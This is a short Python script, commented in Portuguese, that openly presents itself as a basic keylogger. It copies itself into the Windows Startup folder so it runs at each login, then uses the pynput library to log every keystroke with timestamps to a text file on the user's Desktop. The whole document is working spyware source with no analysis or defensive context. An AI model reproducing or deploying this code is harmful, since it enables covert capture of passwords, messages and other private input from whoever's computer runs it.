#Keylogger básico feito em python
import os
import logging
from shutil import copyfile
from pynput.keyboard import Listener

username = os.getlogin()

#local onde o arquivo keylogger.txt erá salvo
logging_directory = f"C:/Users/{username}/Desktop"

destination_path = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/keylogger.py'
copyfile(__file__, destination_path)

logging.basicConfig(filename=f"{logging_directory}/keylogger.txt", level=logging.INFO, format="%(asctime)s: %(message)s")

def key_handler(key):
    logging.info(str(key))

with Listener(on_press=key_handler) as listener:
    listener.join()
